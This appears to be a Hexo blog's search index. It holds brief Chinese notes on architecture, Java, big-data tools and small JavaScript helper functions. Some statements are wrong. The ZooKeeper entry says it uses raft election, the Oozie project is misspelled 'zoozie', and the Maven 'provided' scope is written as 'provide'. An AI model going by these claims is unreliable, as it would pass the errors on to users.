<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Service Mesh 服务网格</title>
      <link href="/architecture/architecture/service-mesh/"/>
      <url>/architecture/architecture/service-mesh/</url>
      
        <content type="html"><![CDATA[<h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li><a href="https://blog.csdn.net/zl1zl2zl3/article/details/84440685" target="_blank" rel="noopener">https://blog.csdn.net/zl1zl2zl3/article/details/84440685</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>zoozie</title>
      <link href="/bigdata/bigdata/zoozie/"/>
      <url>/bigdata/bigdata/zoozie/</url>
      
        <content type="html"><![CDATA[<p>zoozie 是一个Hadoop的项目中用于任务编排，例如zoozie可以处理 spark 的任务。</p>]]></content>
      
      
      <categories>
          
          <category> bigdata </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>OpenResty</title>
      <link href="/architecture/architecture/open-resty/"/>
      <url>/architecture/architecture/open-resty/</url>
      
        <content type="html"><![CDATA[<p>OpenResty® 是一个基于 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。</p>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Seata</title>
      <link href="/architecture/architecture/seata/"/>
      <url>/architecture/architecture/seata/</url>
      
        <content type="html"><![CDATA[<p>Seata（曾用名Fescar,开源版本GTS）是阿里的开源分布式事务框架，其RoadMap中指出了其希望与社区合作重新构建出一个全面的分布式事务框架。</p>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>zookeeper</title>
      <link href="/bigdata/bigdata/zookeeper/"/>
      <url>/bigdata/bigdata/zookeeper/</url>
      
        <content type="html"><![CDATA[<p>Zookeeper 是一个分布式协调工具。在数据高可用的情况下，用来选主机。类似于 keepalived。</p><p>采用 raft 选举协议。</p><p>提供的特性</p><ul><li>管理配置信息</li><li>提供统一的命名服务</li><li>分布式状态同步</li><li>集群管理</li></ul><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>raft.github.io</li></ul>]]></content>
      
      
      <categories>
          
          <category> bigdata </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Apache Mina</title>
      <link href="/network/network/mina/"/>
      <url>/network/network/mina/</url>
      
        <content type="html"><![CDATA[<p>Apache Mina 是一款网络通信框架，用来处理网络IO，提供低级、高级的网络相关的API。</p><p>类似框架：</p><ul><li>Grizzly</li><li>Netty 4</li><li>QuickServer</li><li>xSocket</li></ul><h2 id="https-en-wikipedia-org-wiki-Apache-MINA"><a href="#https-en-wikipedia-org-wiki-Apache-MINA" class="headerlink" title="https://en.wikipedia.org/wiki/Apache_MINA"></a><a href="https://en.wikipedia.org/wiki/Apache_MINA" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Apache_MINA</a></h2>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>maven 常见 scopes</title>
      <link href="/java/java/maven-scopes/"/>
      <url>/java/java/maven-scopes/</url>
      
        <content type="html"><![CDATA[<ol><li><p>compile 默认是compile。compile表示被依赖项目需要参与当前项目的编译，包括后续的测试，运行周期也参与其中，是一个比较强的依赖。打包的时候通常需要包含进去。</p></li><li><p>test 表示依赖项目仅仅参与测试相关的工作，包括测试代码的编译，执行。比较典型的如junit</p></li><li><p>runtime 表示被依赖项目无需参与项目的编译，不过后期的测试和运行周期需要其参与。与compile相比，跳过编译而已。在终端的项目（非开源，企业内部系统.中，和compile区别不是很大。比较常见的如JSRXXX的实现，对应的API jar是compile，具体实现是runtime的，compile只需要知道接口就足够了。oracle jdbc驱动jar包就是一个很好的例子，一般scope为runtime。  另runtime的依赖通常和optional搭配使用，optional为true。即可以用A实现也可以用B实现。</p></li><li><p>provide 意味着打包的时候可以不用包进去，别的设施（web container.会提供。事实上该依赖理论上可以参与编译、测试、运行等周期。相当于compile，但是打包阶段做了exclude的动作。</p></li><li><p>system 和provide相同，不过被依赖项不会从maven仓库抓，而是从本地系统文件拿，一定要配合systemPath使用</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 中常见的测试方案</title>
      <link href="/java/java/java-testing/"/>
      <url>/java/java/java-testing/</url>
      
        <content type="html"><![CDATA[<ul><li>单元测试</li><li>Spring mvc 下的集成测试</li><li>Spring boot 下的集成测试</li><li>Pact 测试</li><li>API 测试</li></ul><h2 id="常用的mock-工具"><a href="#常用的mock-工具" class="headerlink" title="常用的mock 工具"></a>常用的mock 工具</h2><ul><li>Powermock</li><li>Mockito</li><li>wiremock</li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JHipster</title>
      <link href="/java/java/jhipster/"/>
      <url>/java/java/jhipster/</url>
      
        <content type="html"><![CDATA[<p>一个Java脚手架, 用于生成，开发，部署Spring Boot + Angular/React Web Application和Spring microservices。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li><a href="https://www.jhipster.tech/" target="_blank" rel="noopener">https://www.jhipster.tech/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>spring-restdocs-asciidoctor</title>
      <link href="/API-service/api/spring-restdocs-asciidoctor/"/>
      <url>/API-service/api/spring-restdocs-asciidoctor/</url>
      
        <content type="html"><![CDATA[<p>Spring 提供的一套 rest API 文档生成工具，通过 adoc 文件生成漂亮的 API 文档。</p><h2 id="其他方案"><a href="#其他方案" class="headerlink" title="其他方案"></a>其他方案</h2><ul><li>使用契约文件</li><li>使用 Swagger</li></ul>]]></content>
      
      
      <categories>
          
          <category> API&amp;service </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CAP 理论</title>
      <link href="/architecture/architecture/cap/"/>
      <url>/architecture/architecture/cap/</url>
      
        <content type="html"><![CDATA[<p>CAP原则又称CAP定理，指的是在一个分布式系统中，Consistency（一致性）、 Availability（可用性）、Partition tolerance（分区容错性）。</p><p>实际上 CAP 理论中分区容错性必须要求，所以现实分布式系统中就变成 CP 和 AP 中选择。</p>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Prometheus 开源设备监控平台</title>
      <link href="/architecture/architecture/prometheus/"/>
      <url>/architecture/architecture/prometheus/</url>
      
        <content type="html"><![CDATA[<p>Prometheus 是一个监控设备运行情况的工具，例如CPU、内存、网络使用率等信息。并能及时发出告警。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li><a href="https://prometheus.io/docs/introduction/overview/" target="_blank" rel="noopener">https://prometheus.io/docs/introduction/overview/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>thrift RPC 调用框架</title>
      <link href="/architecture/architecture/thrift/"/>
      <url>/architecture/architecture/thrift/</url>
      
        <content type="html"><![CDATA[<p>Thrift是一种接口描述语言和二进制通讯协议，它被用来定义和创建跨语言的服务。它被当作一个远程过程调用（RPC）框架来使用，是由Facebook为“大规模跨语言服务开发”而开发的。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li><a href="http://thrift.apache.org/" target="_blank" rel="noopener">http://thrift.apache.org/</a> 官网</li></ul>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>面向对象（oo）的几个原则</title>
      <link href="/architecture/architecture/oo/"/>
      <url>/architecture/architecture/oo/</url>
      
        <content type="html"><![CDATA[<ul><li>单一职责原则 一个类只做一个事</li><li>开闭原则 对拓展开放，对修改 封闭</li><li>李氏替换原则 子类能替换父类</li><li>依赖倒置原则 依赖接口，而不是依赖具体实现（service 依赖 dao，变成了dao 依赖 dao的接口）</li><li>接口隔离原则 使用多个独立的接口而不是一个大而全的接口</li><li>组合重用原则 使用组合而不是使用继承</li><li>命令查询分离 CQS 原则</li></ul>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>UML 基础</title>
      <link href="/architecture/architecture/uml/"/>
      <url>/architecture/architecture/uml/</url>
      
        <content type="html"><![CDATA[<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p>重要的一张图 </p><p><img src="https://upload.wikimedia.org/wikipedia/commons/0/0b/Uml_class_relation_arrows_en.svg.png" alt=""></p><p>常用的图示：</p><ul><li>继承父类 实线和三角形箭头</li><li>实现接口 虚线和三角箭头</li><li>依赖 虚线和箭头</li><li>关联 实线和箭头</li></ul><p>记住继承和实现即可</p>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>apollo 配置中心</title>
      <link href="/architecture/architecture/apollo/"/>
      <url>/architecture/architecture/apollo/</url>
      
        <content type="html"><![CDATA[<p>Apollo（阿波罗）是携程框架部门研发的分布式配置中心，能够集中化管理应用不同环境、不同集群的配置，配置修改后能够实时推送到应用端，并且具备规范的权限、流程治理等特性，适用于微服务配置管理场景。</p><p>服务端基于Spring Boot和Spring Cloud开发，打包后可以直接运行，不需要额外安装Tomcat等应用容器。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li><a href="https://github.com/ctripcorp/apollo" target="_blank" rel="noopener">https://github.com/ctripcorp/apollo</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>标准技术下的软件开发</title>
      <link href="/architecture/architecture/tech-standard/"/>
      <url>/architecture/architecture/tech-standard/</url>
      
        <content type="html"><![CDATA[<h2 id="常见标准制定组织"><a href="#常见标准制定组织" class="headerlink" title="常见标准制定组织"></a>常见标准制定组织</h2><ul><li>IEEE </li><li>W3C</li><li>IETF</li><li><a href="https://en.wikipedia.org/wiki/Ecma_International" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Ecma_International</a> ECMA</li><li>OSGi</li><li>OMG <a href="https://en.wikipedia.org/wiki/Object_Management_Group" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Object_Management_Group</a></li></ul><h3 id="国内的标准"><a href="#国内的标准" class="headerlink" title="国内的标准"></a>国内的标准</h3><ul><li>SAC — Standardization Administration of China</li><li>CSSN — China Standards Information Center</li><li>GB/T</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://en.wikipedia.org/wiki/List_of_technical_standard_organisations" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/List_of_technical_standard_organisations</a></li></ul><h2 id="常见的技术标准"><a href="#常见的技术标准" class="headerlink" title="常见的技术标准"></a>常见的技术标准</h2><h3 id="Restful-相关"><a href="#Restful-相关" class="headerlink" title="Restful 相关"></a>Restful 相关</h3><ul><li>JAX-RS APIs</li><li>JSR 311 </li><li>JSR 339</li><li><a href="https://tools.ietf.org/html/rfc6570" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc6570</a> URI Template</li><li><a href="https://github.com/raml-org/raml-spec/blob/master/versions/raml-10/raml-10.md/" target="_blank" rel="noopener">https://github.com/raml-org/raml-spec/blob/master/versions/raml-10/raml-10.md/</a> RAML</li><li><a href="https://jsonapi.org/" target="_blank" rel="noopener">https://jsonapi.org/</a> </li></ul><h3 id="授权相关"><a href="#授权相关" class="headerlink" title="授权相关"></a>授权相关</h3><ul><li>OAuth2</li><li>LDAP</li></ul><h3 id="序列化相关"><a href="#序列化相关" class="headerlink" title="序列化相关"></a>序列化相关</h3><ul><li><a href="http://json.org/" target="_blank" rel="noopener">http://json.org/</a> </li><li><a href="https://www.w3.org/TR/REC-xml/" target="_blank" rel="noopener">https://www.w3.org/TR/REC-xml/</a> XML </li></ul><h3 id="Javascript-相关"><a href="#Javascript-相关" class="headerlink" title="Javascript 相关"></a>Javascript 相关</h3><ul><li>Ecma</li></ul><h3 id="测试相关"><a href="#测试相关" class="headerlink" title="测试相关"></a>测试相关</h3><ul><li>GB/T 15532-2008 测试类型定义</li></ul>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>RESTEasy</title>
      <link href="/architecture/architecture/Resteasy/"/>
      <url>/architecture/architecture/Resteasy/</url>
      
        <content type="html"><![CDATA[<p>RESTEasy 是JBoss的开源项目之一,是一个RESTful Web Services框架。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li><a href="https://resteasy.github.io/" target="_blank" rel="noopener">https://resteasy.github.io/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Jersey RESTful</title>
      <link href="/architecture/architecture/jersey/"/>
      <url>/architecture/architecture/jersey/</url>
      
        <content type="html"><![CDATA[<p>Jersey RESTful 框架是开源的RESTful框架, 实现了JAX-RS (JSR 311 &amp; JSR 339) 规范。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li><a href="https://jersey.github.io/" target="_blank" rel="noopener">https://jersey.github.io/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Zipkin 分布式跟踪系统</title>
      <link href="/architecture/architecture/zipkin/"/>
      <url>/architecture/architecture/zipkin/</url>
      
        <content type="html"><![CDATA[<p>Zipkin 是一个分布式的追踪系统，每个应用程序向Zipkin报告定时数据，Zipkin UI呈现了一个依赖图表来展示多少跟踪请求经过了每个应用程序。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li><a href="https://zipkin.io/" target="_blank" rel="noopener">https://zipkin.io/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java service loader</title>
      <link href="/Java/java/java-service-loader/"/>
      <url>/Java/java/java-service-loader/</url>
      
        <content type="html"><![CDATA[<p>Java service loader 可以通过一个接口返回一组具体点实现，在实现策略模式时，特别有用。</p><p>在包 java.util.ServiceLoader 通过定义配置文件记载类的示例。</p><p>例如在 META-INF/services 中 定义一个文件，然后添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.hadoop.java.HDFSService</span><br><span class="line">org.hadoop.java.LocalService</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java unmodifiableMap</title>
      <link href="/Java/java/unmodifiableMap/"/>
      <url>/Java/java/unmodifiableMap/</url>
      
        <content type="html"><![CDATA[<p>集合中提供了一个防止修改的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public final Map&lt;Foo, Bar&gt; getMap()&#123;</span><br><span class="line">    ...</span><br><span class="line">    return Collections.unmodifiableMap(map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>计算高可用方案</title>
      <link href="/architecture/architecture/computed-architedture/"/>
      <url>/architecture/architecture/computed-architedture/</url>
      
        <content type="html"><![CDATA[<h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><ul><li>DNS 负载均衡</li><li>Nginx 应用层 负载均衡 大概 5W/s</li><li>LVS 网络层负载均衡 大概 80W/S</li><li>硬件负载均衡 大概 200W/s - 1000W/s</li></ul>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>储存高性能架构</title>
      <link href="/architecture/architecture/storage-architecture/"/>
      <url>/architecture/architecture/storage-architecture/</url>
      
        <content type="html"><![CDATA[<p>常见方案</p><ul><li>读写分离</li><li>分库</li><li>分表<ul><li>水平切分</li><li>垂直切分</li></ul></li><li>使用No SQL </li><li>使用 Redis</li><li>使用 MemoCache</li><li>使用 Elastic Search</li><li>使用 Hbase 列数据库</li></ul><h2 id="读写分离"><a href="#读写分离" class="headerlink" title="读写分离"></a>读写分离</h2><p>MySQL 读写分离后很可能有1s 左右的延迟需要考虑，解决主从延迟的方案</p><ul><li>写操作后从主库完成读操作，缺点是对业务侵入较大</li><li>二次读取方案。先从从读取，如果没有读取成功，再从主机读取，可以从中间件层实施</li><li>关键业务从主机读取，例如用户信息，类似</li></ul><h2 id="分库分表"><a href="#分库分表" class="headerlink" title="分库分表"></a>分库分表</h2><p>常见问题：</p><ul><li>路由算法<ul><li>范围路由</li><li>HASH 路由</li><li>配置路由</li></ul></li><li>join 问题</li><li>count 问题</li><li>排序问题</li></ul><p>实现方案：</p><ul><li><p>代码层实现 </p><ul><li>TDDL Taobao Distributed data layer</li></ul></li><li><p>中间件</p><ul><li>阿里开源中间件 Drup</li><li>官方 mysql-proxy</li><li>奇虎开源中间件 Atals</li></ul></li></ul><p>分表经验：</p><ul><li>单表数据超过1000W 行就需要考虑分表</li></ul><h2 id="全文索引"><a href="#全文索引" class="headerlink" title="全文索引"></a>全文索引</h2><p>讲关系型数据库的内容转换成 json 输入给 Elastic Search 等全文数据库。</p>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>GraphQL</title>
      <link href="/API-service/api/graphQL/"/>
      <url>/API-service/api/graphQL/</url>
      
        <content type="html"><![CDATA[<p>GraphQL是一个开源的API数据查询和操作语言及实现为了实现上述操作的相应运行环境。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li>标准官方网站 <a href="http://graphql.org/" target="_blank" rel="noopener">http://graphql.org/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> API&amp;service </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Event Storming 事件风暴</title>
      <link href="/architecture/architecture/event-storming/"/>
      <url>/architecture/architecture/event-storming/</url>
      
        <content type="html"><![CDATA[<p>摘自维基百科的解释：</p><p>Event storming is a workshop-based method to quickly find out what is happening in the domain of a software program. Comparing to other methods it is extremely lightweight and requires intentionally no support by a computer. The result is expressed in sticky notes on a wide wall. The business process is “stormed out” as a series of domain events which are denoted as orange stickies. It was invented by Alberto Brandolini in the context of domain-driven design. </p><p>事件风暴是一个快速发现软件系统中领域知识的工作坊方法。这种工作坊通过粘贴卡片的方式来整理团队思绪，实践中可以使用不同的报事贴代表不同的对象。</p><p>事件风暴包含几个部分</p><ul><li>事件头脑风暴</li><li>识别参与者</li><li>识别领域模型</li><li>聚合和边界上下文</li></ul><p>报事贴类型：</p><ul><li>领域事件（Domain Event, 橙色）</li><li>参与领域事件的人（People, 黄色小报事贴）</li><li>热点信息（Hot spot, 深粉）</li><li>业务子域边界（Boundary, 黄色胶带）</li><li>核心业务子域（Subdomain, 蓝色）</li><li>外部系统（External System, 浅粉）</li><li>新的价值或商业机会（Opportunity, 浅绿）</li></ul><p>操作步骤：</p><ul><li>准备物料</li><li>邀请包含领域专家在内的团队所有成员参加</li><li>贴领域事件（橙色）</li><li>贴警告信息（深粉）</li><li>贴业务子域边界（黄色胶带）</li><li>贴核心业务子域（蓝色）</li><li>贴参与领域事件的人（黄色小报事贴）</li><li>贴外部系统（浅粉）</li><li>贴新的价值或商业机会（浅绿）</li><li>投票评选业务瓶颈（画有箭头的蓝色竖条报事贴）</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>致说不清遗留系统需求的开发团队——事件风暴之父的工作坊实录之一：“探索业务全景” <a href="https://www.jianshu.com/p/cf7cfa1dfef9" target="_blank" rel="noopener">https://www.jianshu.com/p/cf7cfa1dfef9</a> </li></ul><h2 id="TOC"><a href="#TOC" class="headerlink" title="TOC"></a>TOC</h2><p>制作一个事件工作坊全过程的PPT动画</p>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>影像图 (Influence diagram)</title>
      <link href="/methodology/methodology/influence-diagram/"/>
      <url>/methodology/methodology/influence-diagram/</url>
      
        <content type="html"><![CDATA[<p>一种分析复杂问题的方法论，通过图表表达事物之间的关系和因果，即事物之间的相互影响。</p><p><img src="/methodology/methodology/influence-diagram/Simple_Influence_Diagram.svg" alt="例子"></p><p>例如：</p><p>天气预报-&gt;出行-&gt;心情</p><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><ul><li><a href="https://en.wikipedia.org/wiki/Influence_diagram" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Influence_diagram</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> methodology </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>一些培训技巧</title>
      <link href="/others/others/training/"/>
      <url>/others/others/training/</url>
      
        <content type="html"><![CDATA[<h2 id="破冰游戏"><a href="#破冰游戏" class="headerlink" title="破冰游戏"></a>破冰游戏</h2><h3 id="答问自我介绍"><a href="#答问自我介绍" class="headerlink" title="答问自我介绍"></a>答问自我介绍</h3><p>培训者站在一列，使用以系列的问题，让培训者分开，然后让小部分人进行自我介绍，通过问题让培训者相互了解，知道自我介绍完成。</p><p>问题列表：</p><ul><li>是否是本地人？</li><li>是否养宠物？</li><li>使用vim？</li><li>PHP是不是最好的语言？</li></ul><h3 id="human-bingo"><a href="#human-bingo" class="headerlink" title="human bingo"></a>human bingo</h3><p>参考地址：<a href="https://plentifun.com/sample-questions-to-play-human-bingo-game" target="_blank" rel="noopener">https://plentifun.com/sample-questions-to-play-human-bingo-game</a></p><h3 id="记住名字"><a href="#记住名字" class="headerlink" title="记住名字"></a>记住名字</h3><p>讲培训者分组，10分钟熟悉彼此，然后从一个人开始说出自己的名字，下一个人重复前面的人的名字然后加上自己的名字。</p>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>洋葱架构 onion architecture</title>
      <link href="/architecture/architecture/onion%20architecture/"/>
      <url>/architecture/architecture/onion%20architecture/</url>
      
        <content type="html"><![CDATA[<p>从里到外是领域模型、领域服务、应用服务，外面的都会用到里面的内容，最外围的是容易变化的内容，如界面、测试和基础设施（如数据存储等）</p>]]></content>
      
      
      <categories>
          
          <category> architecture </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title></title>
      <link href="/uncategorized/frontend/copy-to-clipboard/"/>
      <url>/uncategorized/frontend/copy-to-clipboard/</url>
      
        <content type="html"><![CDATA[<hr><p>title: 复制到剪贴板<br>categories: frontend</p><h2 id="toc-true"><a href="#toc-true" class="headerlink" title="toc:true"></a>toc:true</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 复制到剪贴板</span><br><span class="line"> * @param object</span><br><span class="line"> * @param compareBy</span><br><span class="line"> */</span><br><span class="line">function copyToClipboard(value, document = window.document) &#123;</span><br><span class="line">  const element = document.createElement(&apos;input&apos;)</span><br><span class="line">  element.style.opacity = 0</span><br><span class="line">  element.value = value</span><br><span class="line">  document.body.appendChild(element)</span><br><span class="line">  element.select()</span><br><span class="line"></span><br><span class="line">  setTimeout(function () &#123;</span><br><span class="line">    element.remove()</span><br><span class="line">  &#125;, 0)</span><br><span class="line"></span><br><span class="line">  return document.execCommand(&apos;copy&apos;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title></title>
      <link href="/uncategorized/frontend/clean-null-attributes/"/>
      <url>/uncategorized/frontend/clean-null-attributes/</url>
      
        <content type="html"><![CDATA[<hr><p>title: 清理对象中的空值<br>categories: frontend</p><h2 id="toc-true"><a href="#toc-true" class="headerlink" title="toc:true"></a>toc:true</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 清理对象中的空值</span><br><span class="line"> * @param object</span><br><span class="line"> */</span><br><span class="line">export function cleanNullAttributes(object) &#123;</span><br><span class="line">  const returnValue = &#123;&#125;</span><br><span class="line">  Object.keys(object).map(key =&gt; &#123;</span><br><span class="line">    const value = object[key]</span><br><span class="line">    if (value === undefined || value === null || value === &apos;&apos;) &#123;</span><br><span class="line">      return</span><br><span class="line">    &#125;</span><br><span class="line">    returnValue[key] = value</span><br><span class="line">    return key</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  return returnValue</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title></title>
      <link href="/uncategorized/frontend/http-params-in-path/"/>
      <url>/uncategorized/frontend/http-params-in-path/</url>
      
        <content type="html"><![CDATA[<hr><p>title: URL中path参数绑定<br>categories: frontend</p><h2 id="toc-true"><a href="#toc-true" class="headerlink" title="toc:true"></a>toc:true</h2><p>拼接URL在前端不是很好，例如 ‘/cate/‘+ cateID +’/post/‘+ postID</p><p>可以写成 <code>/cate/:cateID/post/:postID</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">export function getParamlisedPath(pathString, ...params) &#123;</span><br><span class="line">  let result = pathString</span><br><span class="line">  params.forEach((value) =&gt; &#123;</span><br><span class="line">    result = result.replace(/\:\w+/, value)</span><br><span class="line">  &#125;)</span><br><span class="line">  return result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title></title>
      <link href="/uncategorized/frontend/javascript-regular/"/>
      <url>/uncategorized/frontend/javascript-regular/</url>
      
        <content type="html"><![CDATA[<hr><p>title: 常用正则和方法<br>categories: frontend </p><h2 id="toc-true"><a href="#toc-true" class="headerlink" title="toc:true"></a>toc:true</h2><h2 id="数字格式化（每三位加逗号）"><a href="#数字格式化（每三位加逗号）" class="headerlink" title="数字格式化（每三位加逗号）"></a>数字格式化（每三位加逗号）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export const toThousands = num =&gt; &#123;</span><br><span class="line">  return (num || 0).toString().replace(/(\d)(?=(?:\d&#123;3&#125;)+$)/g, &apos;$1,&apos;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title></title>
      <link href="/uncategorized/frontend/vue-move-component-to-body/"/>
      <url>/uncategorized/frontend/vue-move-component-to-body/</url>
      
        <content type="html"><![CDATA[<hr><p>title: 移动Vue组件挂载点到body上<br>categories: frontend</p><h2 id="toc-true"><a href="#toc-true" class="headerlink" title="toc:true"></a>toc:true</h2><p>非常有用的一个指令，可以移动组件到 body上，解决定位和全局遮罩等问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">export const moveElementToBody = &#123;</span><br><span class="line">  inserted(el) &#123;</span><br><span class="line">    if (el) &#123;</span><br><span class="line">      document.body.appendChild(el)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  unbind(el) &#123;</span><br><span class="line">    if (el.parentNode) &#123;</span><br><span class="line">      el.parentNode.removeChild(el)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Web客户端追踪（cookie、浏览器指纹 ）</title>
      <link href="/security/security/user-track/"/>
      <url>/security/security/user-track/</url>
      
